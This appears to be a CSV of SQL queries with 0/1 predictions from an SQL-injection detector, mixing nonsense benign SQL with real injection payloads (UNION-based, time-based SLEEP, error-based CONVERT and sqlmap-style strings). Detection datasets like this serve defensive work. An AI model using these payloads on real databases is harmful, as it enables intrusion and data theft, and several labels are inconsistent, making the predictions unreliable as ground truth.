Generated Queries,Prediction
"1'||  (  select 'iwlj' where 8704  =  8704 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||' OR 1=1",1
SELECT later ( s ) FROM member INNER JOIN OR 1=1,0
4.62514E+14 OR 1=1 --,0
maycel,0
"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1
"   SELECT COUNT ( noun ) , hold FROM pink BY travel OR 1=1 --",0
"protti tarrasa AND IF(1=1, SLEEP(5), 0) --",1
.32l6152v0o UNION SELECT * FROM information_schema.tables,1
"8.87551E+14 AND 1=CONVERT(int, (SELECT @@version))",1
keehn OR 1=1,0
pallen OR 1=1,1
"   SELECT Employees.count, COUNT ( Orders.stepID )  AS fiftyFROM    ( OrdersINNER JOIN reason ON Orders.panID  =  Employees.signalID )  UNION%20SELECT%20%2A",0
miramar UNION SELECT *,0
 (  select   (  case when   (  6838  =  2866  )   then 6838 else 1/  (  select 0  )   end   )    )  AND SLEEP(5),1
SELECT bottle FROM boy OR 1=1,0
"1""  )   as htyo where 8322  =  8322 and 4595  =  4595# OR 'a'='a'",1
"1' and make_set  (  8403  =  8403,8899  )   OR 313d31",1
SELECT feet ( s )  FROM spirit SELECT instant FROM pay OR 1=1,0
"INSERT INTO ran ( instrument, wrong, oldest, few, wore, body )  VALUES  ( 'swept', 'dropped'. repeat', 'cookies', 'bark', 'carbon', 'tonight' )  ",0
select * from users where id  =  1 or \<\. or 1  =  1 -- 1 AND SLEEP(5),1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'vfxg' like 'vfxg OR 1=1",1
vinko OR 313d31,0
"carrera AND 1=CONVERT(int, (SELECT @@version))",1
"koock@aridossanchez.mt AND IF(1=1, SLEEP(5), 0) --",1
"1""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""abcm"" like ""abcm AND IF(1=1, SLEEP(5), 0) --",1
"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # UNION SELECT * FROM information_schema.tables",1
"SELECT * FROM tongue ORDER BY week AND IF(1=1, SLEEP(5), 0) --",0
"-3228""  )   or   (  5901  =  1570  )  *1570 and   (  ""egdd""  =  ""egdd AND IF(1=1, SLEEP(5), 0) --",1
SELECT * FROM sign WHERE dance  BETWEEN 10 AND 20 OR 313d31,0
1  )   as mpnj where 5049  =  5049 UNION SELECT column_name FROM (SELECT * FROM information_schema.tables) AS sub,1
" end and    (    (     (  ""zpii"" like ""zpii UNION%20SELECT%20%2A",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367678,299806,299807,367679,299808,80777,30322,80782,28561,262315,299804,30387,228217,367680,367681,367682,367683,367684,367685,367686,30220,262317,30380,80779,30384,30390,80780,290065,291072,320706 )  ORDER BY meta_id ASC UNION SELECT *",0
"SELECT column1 , column2, ... FROM table_name ; OR 1=1",0
m1n*6848,1
1%'   )    )     )   and 2006  =  2006 AND SLEEP(5),1
SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLY OR 'a'='a',0
SELECT TOP 50 PERCENT * FROM leaf SELECT * FROM store FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wife OR 1=1,0
SELECT south ( s )  FROM just UNION ALL OR 1=1,0
"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845# AND SLEEP(5)",1
"1""  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""zzkc""  =  ""zzkc AND IF(1=1, SLEEP(5), 0) --",1
17621392b UNION SELECT * FROM information_schema.tables,1
crespo bullones OR 1=1,1
SELECT * FROM swung ORDER BY recent DESC UNION%20SELECT%20%2A,0
"1   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- --",1
"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2868  =  2868 AND 1=CONVERT(int, (SELECT @@version))",1
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'ozef'  =  'ozef OR 1=1",1
"  SELECT whomID AS ID, careful AS darkness FROM mountain",0
-1396 where 5838  =  5838 or 9323  =  9323# --,1
"SELECT * FROM border 3 AND IF(1=1, SLEEP(5), 0) --",1
SELECT * FROM dress  WHERE fat = excited --,0
SELECT did ( s )  FROM dear LEFT JOIN UNION SELECT *,0
